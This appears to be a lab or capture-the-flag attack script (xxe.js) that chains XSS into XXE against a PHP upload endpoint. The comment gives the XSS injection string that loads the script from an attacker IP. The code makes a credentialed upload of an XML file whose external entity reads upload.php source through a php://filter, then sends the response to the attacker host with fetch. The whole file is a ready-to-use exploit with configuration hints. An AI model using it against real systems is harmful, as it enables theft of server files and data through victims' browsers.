// this is xxe.js. XSS Payload: "><script src=http://192.168.32.133:1337/xxe.js></script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/localhost\/secaura\/upload.php", true); // check the path might be /secaura or /blog (depends on your setup)
xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryIWVuNqKqQF7AtNDv");
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
    if(this.readyState === 4) {
        console.log(this.responseText);
        
        // Extract the base64 encoded content from the response
        // You might need to adjust this parsing based on your actual response format
        var response = this.responseText;
        
        // Exfiltrate the response
        fetch("http://192.168.32.133:1337/content?url=" + encodeURIComponent("xxe") + "&content=" + encodeURIComponent(response), { // change IP and port 
            method: "GET",
            mode: "no-cors" // This bypasses CORS but you won't get a response
        }).catch(function(error) {
            console.log("Fetch error (expected with no-cors):", error);
        });
    }
});

var body = "------WebKitFormBoundaryIWVuNqKqQF7AtNDv\r\n" + 
  "Content-Disposition: form-data; name=\"comments\"; filename=\"test.xml\"\r\n" + 
  "Content-Type: text/xml\r\n" + 
  "\r\n" + 
  "\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?\x3e\r\n" + 
  "\x3c!DOCTYPE xxeFileRead [\x3c!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=upload.php\"\x3e]\x3e\r\n" + 
  "\x3ccomments\x3e\r\n" + 
  "    \x3cname\x3eSoliman\x3c/name\x3e\r\n" + 
  "    \x3ccomment\x3e&file;\x3c/comment\x3e\r\n" + 
  "\x3c/comments\x3e\r\n" + 
  "------WebKitFormBoundaryIWVuNqKqQF7AtNDv\r\n" + 
  "Content-Disposition: form-data; name=\"submit\"\r\n" + 
  "\r\n" + 
  "Upload Image\r\n" + 
  "------WebKitFormBoundaryIWVuNqKqQF7AtNDv--\r\n";

var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 

xhr.send(new Blob([aBody]));
